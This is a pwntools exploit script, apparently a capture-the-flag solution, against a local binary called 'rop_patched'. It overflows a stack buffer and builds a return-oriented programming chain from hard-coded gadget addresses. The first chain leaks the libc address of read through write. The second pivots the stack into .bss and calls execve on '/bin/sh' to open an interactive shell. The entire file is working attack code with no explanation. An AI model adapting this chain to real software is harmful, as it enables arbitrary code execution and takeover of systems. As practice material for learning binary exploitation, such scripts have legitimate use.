#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")

context.binary = exe
libc = exe.libc


def conn():
    r = process([exe.path])
    #gdb.attach(r)
    return r

set_rdi_gadget = 0x0000000000400613 # pop rdi ; ret
set_rsi_r15_gadget = 0x0000000000400611 # pop rsi ; pop r15; ret
set_rdx_gadget = 0x4005b7 # set rdx to r15
set_rbp_gadget = 0x00000000004004b8 # pop rbp ; ret

def main():
    r = conn()
    r.recvuntil("Input: ")
    buffer = b"a" * 0x40
    stack_base = 0x000000000601038 + 0x100 # address of bss + 0x100
    buffer += p64(stack_base)
    buffer += p64(set_rsi_r15_gadget)
    buffer += p64(0)
    buffer += p64(0x8)
    buffer += p64(set_rdx_gadget)
    buffer += p64(0)
    buffer += p64(0)
    buffer += p64(set_rdi_gadget)
    buffer += p64(0x1)
    buffer += p64(set_rsi_r15_gadget)
    buffer += p64(exe.got["read"])
    buffer += p64(0)
    buffer += p64(exe.plt["write"])

    buffer += p64(set_rbp_gadget)
    buffer += p64(stack_base)
    
    buffer += p64(0x40058a)
    r.sendline(buffer)
    leak = r.recv(8)
    read_address = unpack(leak)
    libc.base = read_address - libc.symbols["read"]
    print(hex(libc.base))
    buffer = b"/bin/sh\x00"
    buffer += b"a" * (0x40 - len(buffer))
    buffer += p64(stack_base + 0x100)

    buffer += p64(set_rsi_r15_gadget)
    buffer += p64(0)
    buffer += p64(0)

    buffer += p64(set_rdx_gadget)
    buffer += p64(0)
    buffer += p64(0)

    buffer += p64(set_rsi_r15_gadget)
    buffer += p64(0)
    buffer += p64(0)
    
    buffer += p64(set_rdi_gadget)
    buffer += p64(stack_base - 0x40)
    
    execve_address = libc.symbols["execve"] + libc.base
    print(hex(execve_address))
    buffer += p64(execve_address)

    assert len(buffer) <= 0x480
    r.sendline(buffer)
    r.interactive()


if __name__ == "__main__":
    main()
